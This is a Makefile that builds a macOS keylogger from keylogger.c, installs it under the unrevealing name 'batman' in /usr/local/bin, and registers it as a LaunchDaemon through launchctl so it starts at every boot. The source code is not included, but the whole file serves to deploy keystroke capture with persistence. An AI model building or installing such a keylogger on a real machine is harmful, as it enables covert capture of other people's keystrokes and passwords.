EXECUTABLE=batman
PLIST=keylogger.plist
INSTALLDIR=/usr/local/bin
PLISTFULL=/Library/LaunchDaemons/$(PLIST)

all: keylogger.c
	gcc keylogger.c -framework ApplicationServices -framework Carbon -o $(EXECUTABLE)

install: all
	mkdir -p $(INSTALLDIR)
	cp $(EXECUTABLE) $(INSTALLDIR)

uninstall:
	launchctl unload $(PLISTFULL)
	rm $(INSTALLDIR)/$(EXECUTABLE)
	rm -f $(PLISTFULL)

startup: install
	cp $(PLIST) $(PLISTFULL)
	launchctl load -w $(PLISTFULL)

load:
	launchctl load $(PLISTFULL)

unload:
	launchctl unload $(PLISTFULL)

clean:
	rm $(EXECUTABLE)
